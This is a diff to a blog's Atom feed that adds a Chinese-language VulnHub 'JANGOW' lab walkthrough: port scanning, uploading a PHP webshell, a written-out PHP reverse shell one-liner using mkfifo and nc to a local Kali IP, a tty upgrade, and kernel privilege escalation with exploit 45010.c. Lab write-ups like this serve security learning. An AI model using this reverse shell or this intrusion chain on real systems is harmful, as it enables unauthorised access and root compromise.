@@ -13,7 +13,43 @@
         <id>https://an0xia.github.io/2022/07/06/vulnhub-JANGOW/</id>
         <title>JANGOW</title>
         <link rel="alternate" href="https://an0xia.github.io/2022/07/06/vulnhub-JANGOW/"/>
-        <content type="html">&lt;p&gt;This post contains 3 tags. Make sure your theme can display all of the tags.&lt;/p&gt;
+        <content type="html">&lt;p&gt;首先配置一下虚拟机，因为 ova 格式用 VM 导入的话，是不显示 ip 的，具体配置网上都有，这里就不说了&lt;/p&gt;
+&lt;p&gt;配置成功后，在本机上使用 arp-scan -l 就可以看到靶机 ip (用来验证是否配置成功)&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/An0xia/Picture/master/202207061646295.png?token=AU26TI3AORPJTFDFFVHDDJ3CYVGBS&#34; alt=&#34;image-20220706164621250&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;端口扫描&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/07/06/D5f1rEh8AxVond2.png&#34; alt=&#34;image-20220706173442839&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;开放了 80 端口，所以直接访问看看，点点点，就发现可疑接口&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/07/06/oSWHbsaAE8YtzDc.png&#34; alt=&#34;image-20220706173524813&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;写个一句话木马传上去，蚁剑连&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/07/06/XeMdtG5NIQZiV4F.png&#34; alt=&#34;image-20220706173618962&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;再 WordPress 下面发现配置文件&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/07/06/Uo3f9mk6wqplRa8.png&#34; alt=&#34;image-20220706173707830&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;在 /var/www/html 下有个.backup 文件&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/07/06/mVCSTAijWdMaODt.png&#34; alt=&#34;image-20220706173832888&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;然后尝试登录系统，但是并没有发现什么有用的东西，先写个反弹 shell 吧&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/07/06/UKu5WPpTQcYaJ2i.png&#34; alt=&#34;image-20220706174421828&#34; /&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php system(&amp;quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 192.168.248.129 443 &amp;gt;/tmp/f&amp;quot;);?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/07/06/KUhCFndli5TceAI.png&#34; alt=&#34;image-20220706175349190&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;kali 本地监听 443 端口，浏览器访问刚才创建的反弹 shell 的文件 2.php&lt;br /&gt;
+ 出现下图界面即为反弹成功&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/07/06/DwHCPnhxFMty9Tk.png&#34; alt=&#34;image-20220706175448414&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;升级 tty shell&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;python3 -c &#39;import pty;pty.spawn(&amp;quot;/bin/bash&amp;quot;)&#39;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/07/06/c9E5eHlkqLiSswC.png&#34; alt=&#34;image-20220706175721981&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;查看一下内核版本&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/07/06/9bwqlPt4vmXZGQH.png&#34; alt=&#34;image-20220706175824793&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;在 kali 里找一下有没有该版本的漏洞信息，果然发现&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/07/06/itW6IpjKSJ2dcXu.png&#34; alt=&#34;image-20220706175910491&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;使用命令，把 &lt;code&gt;.c&lt;/code&gt;  文件下下来，然后直接在本地 &lt;code&gt;gcc 45010.c -o exp&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/07/06/q8GlWNxzikMnAmH.png&#34; alt=&#34;image-20220706180048930&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;编译完成以后我们通过 ftp 服务上传到靶机中&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/07/06/Cx4izEsfWOLHtIZ.png&#34; alt=&#34;image-20220706180304820&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;再回到靶机那边，给 exp 权限，最后提权成功&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/07/06/SwEB1lrnDcF9KO7.png&#34; alt=&#34;image-20220706180656881&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;进入 root 目录下，发现第二个 flag&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/07/06/mobxRfqedOJH6hY.png&#34; alt=&#34;image-20220706180751632&#34; /&gt;&lt;/p&gt;
 </content>
         <category term="内网" scheme="https://an0xia.github.io/categories/%E5%86%85%E7%BD%91/" />
         <category term="vulnhub" scheme="https://an0xia.github.io/tags/vulnhub/" />
